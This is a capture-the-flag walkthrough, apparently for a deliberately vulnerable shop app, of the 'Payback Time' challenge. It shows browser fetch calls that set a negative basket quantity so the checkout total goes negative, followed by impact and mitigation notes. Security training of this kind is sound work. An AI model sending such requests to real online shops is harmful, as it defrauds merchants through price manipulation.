# Payback Time

## Category
Improper Input Validation — Difficulty: ⭐⭐⭐

## Description

Place an order that makes you rich by setting a negative quantity for a product in the basket.

## Vulnerability

The `/api/BasketItems/:id` endpoint accepts negative quantities without validation. By setting a negative quantity, the total price becomes negative, effectively crediting money to the attacker's account.

## Steps

1. Log in and add a product to the basket
2. Find the BasketItem ID:

```javascript
fetch('/api/BasketItems/', {
  headers: {'Authorization': 'Bearer ' + localStorage.getItem('token')}
}).then(r=>r.json()).then(console.log)
```

3. Set a negative quantity on a BasketItem:

```javascript
fetch('/api/BasketItems/9', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({quantity: -100})
}).then(r=>r.json()).then(console.log)
```

4. Navigate to the basket and complete the checkout — the total is negative, making you rich.

## Impact

An attacker can place orders with negative totals, causing financial damage to the shop and potentially receiving money.

## Mitigation

- Validate that quantity values are always positive
- Implement server-side checks for all numerical inputs
- Never trust client-supplied values without validation
